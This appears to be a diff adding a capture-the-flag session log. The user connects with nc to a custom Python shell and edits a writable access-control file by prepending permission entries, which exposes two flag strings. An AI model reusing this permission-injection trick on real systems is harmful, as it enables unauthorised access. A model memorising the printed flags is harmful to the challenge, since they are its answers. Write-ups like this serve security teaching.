@@ -1,0 +1,42 @@
+% nc challenges.auctf.com 30010
+Welcome to my custom shell written in Python! To get started type `help`
+user@pyshell$ help
+
+Use help <command> for help on specific command.
+================================================
+cat  help  ls  write
+
+user@pyshell$ ls
+acl.txt
+user.txt
+flag.txt
+user@pyshell$ cat flag.txt
+Don't have da permzzz
+user@pyshell$ cat user.txt
+this is some user content. I bet u wish the flag was here
+user@pyshell$ cat acl.txt
+user.txt:user:600
+.acl.txt:root:600
+.flag.txt:user:600
+flag.txt:root:600
+acl.txt:root:606
+user@pyshell$ cat .flag.txt
+nope not here sorry :)
+user@pyshell$ cat .acl.txt
+Don't have da permzzz
+user@pyshell$ help write   
+
+        write <content> <filename>
+        adds content to the beginning of the file.
+        
+user@pyshell$ write flag.txt:user:666
+user@pyshell$ write .acl.txt:user:666
+user@pyshell$ write flag.txt:user:666 acl.txt
+flag.txt:user:666
+user@pyshell$ write .acl.txt:user:666 acl.txt
+.acl.txt:user:666
+user@pyshell$ cat flag.txt
+aUctf_{h3y_th3_fl4g}
+user@pyshell$ cat .acl.txt
+auctf{h4_y0u_g0t_tr0ll3d_welC0m#_t0_pWN_l@nd}
+user@pyshell$ 
